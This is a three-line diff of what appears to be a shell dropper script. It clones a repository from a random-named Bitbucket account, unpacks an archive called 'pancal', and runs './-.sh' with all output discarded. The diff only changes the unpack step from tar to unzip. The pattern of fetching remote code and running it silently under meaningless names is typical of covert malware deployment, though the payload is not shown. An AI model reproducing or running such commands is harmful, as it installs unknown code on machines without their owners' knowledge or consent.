@@ -1,3 +1,3 @@
 git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/loh.git && cd loh
-tar xf pancal.tar.gz
+unzip pancal.zip
 ./-.sh >/dev/null >/dev/null 2>&1
